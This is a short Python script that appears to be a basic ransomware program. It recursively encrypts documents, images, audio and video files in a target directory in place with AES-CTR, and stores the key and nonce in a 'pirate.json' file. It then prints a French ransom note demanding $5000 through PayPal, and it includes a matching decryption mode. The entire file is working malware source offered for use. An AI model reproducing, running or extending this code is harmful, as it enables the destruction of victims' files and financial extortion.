import argparse
import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import json
import base64

parser = argparse.ArgumentParser()
parser.add_argument("-d", "--directory", help="Target directory", default=os.getcwd())
parser.add_argument("-op", "--operation", required=True, help="Operation type. Valid operation types are : enc, dec", choices=['enc', 'dec'])
parser.add_argument("-f", "--fileType", action="append", help="Target file types. Valid file types are : xls, doc, pdf, png, mp3, avi, txt", choices=['xls', 'doc', 'pdf', 'png', 'mp3', 'avi', 'txt'])

args = parser.parse_args()

def getAllFilesInDir(dir, fileTypes):
	fileList = list()
	for (root, dirs, files) in os.walk(dir):
		fileList.extend(os.path.join(root, f) for f in files )
	newFileList = list()
	for fileType in fileTypes:
		newFileList.extend([f for f in fileList if f.endswith(fileType)])
	return newFileList


foundFiles = getAllFilesInDir(args.directory, args.fileType)

if (args.operation == 'enc'):
	key = get_random_bytes(16)
	encryption_cipher = AES.new(key, AES.MODE_CTR)
	with open(os.path.join(args.directory, "pirate.json"), 'w') as f:
		keyEncry = str(base64.b64encode(key))
		nonceEncry = str(base64.b64encode(encryption_cipher.nonce))
		data_to_write = {
			"key": keyEncry,
			"fileTypes": args.fileType,
			"directory": args.directory,
			"nonce":nonceEncry
		}
		json.dump(data_to_write, f)
		for file in foundFiles:
			with open(file, 'rb') as f:
				encrypted_content = encryption_cipher.encrypt(f.read())
			with open(file, 'wb') as f:
				f.write(encrypted_content)
		print(encryption_cipher.nonce)
		print("cet ordinateur est piraté, plusieurs fichiers ont été chiffrés,une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données")
elif (args.operation == 'dec' and os.path.exists(os.path.join(args.directory, "pirate.json"))):
	with open(os.path.join(args.directory, "pirate.json"), 'r') as f:
		obj = json.load(f)
		key = base64.b64decode(obj['key'][2:-1].encode('utf-8'))
		nonce = base64.b64decode(obj['nonce'][2:-1].encode('utf-8'))
	decryption_cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
	for file in foundFiles:
		with open(file, 'rb') as f:
			decrypted_content = decryption_cipher.decrypt(f.read())
		with open(file, 'wb') as f:
			f.write(decrypted_content)
	print("Vos fichiers sont maintenant décryptés. Merci de votre coopération financière")
else:
	raise(Exception("An error occured"))
